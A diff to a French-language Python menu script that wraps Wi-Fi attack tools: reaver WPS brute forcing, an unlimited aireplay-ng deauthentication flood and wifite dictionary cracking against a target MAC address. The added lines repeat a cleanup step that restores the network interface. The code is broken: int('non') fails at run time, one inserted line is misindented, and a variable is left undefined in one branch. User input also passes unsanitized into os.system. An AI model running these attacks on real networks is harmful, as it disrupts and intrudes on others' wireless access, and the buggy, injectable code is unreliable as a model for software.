@@ -75,10 +75,20 @@ if opt == str("1"):
 
         os.system("clear")
         os.system("reaver -i wlan0mon -b " + MAC + " -vv")
+    quite = input("voulez vous enlever votre interface en pause ? (oui ou non) : ")
+    if quite == str("non"):
+        quit()
+    if quite == str("oui"):
+        msp = input("Veullier enter le nom de votre interface mise en pause : ")
+        os.system("ifconfig " + msp + " up")
+        os.system("clear")
+        os.system("airmon-ng stop wlan0mon")
+        os.system("clear")
+        quit()
     if cont == int("non"):
         quit()
-
-
+        
+        
 if opt == str("3"):
     os.system("clear")
     print("************************************************************")
@@ -98,6 +108,18 @@ if opt == str("3"):
 
         os.system("clear")
         os.system("aireplay-ng -0 0 -a" + mac2 + " --ignore-negative-one wlan0mon")
+    if cont == int("non"):
+        quit()
+     quite = input("voulez vous enlever votre interface en pause ? (oui ou non) : ")
+    if quite == str("non"):
+        quit()
+    if quite == str("oui"):
+        msp = input("Veullier enter le nom de votre interface mise en pause : ")
+        os.system("ifconfig " + msp + " up")
+        os.system("clear")
+        os.system("airmon-ng stop wlan0mon")
+        os.system("clear")
+        quit()
     if cont == int("non"):
         quit()
 
@@ -123,6 +145,18 @@ if opt == str("2"):
         if opls == str("2"):
             os.system("clear")
             os.system("wifite --dict password.txt")
+    if cont == int("non"):
+        quit()
+        quite = input("voulez vous enlever votre interface en pause ? (oui ou non) : ")
+    if quite == str("non"):
+        quit()
+    if quite == str("oui"):
+        msp = input("Veullier enter le nom de votre interface mise en pause : ")
+        os.system("ifconfig " + msp + " up")
+        os.system("clear")
+        os.system("airmon-ng stop wlan0mon")
+        os.system("clear")
+        quit()
     if cont == int("non"):
         quit()
 
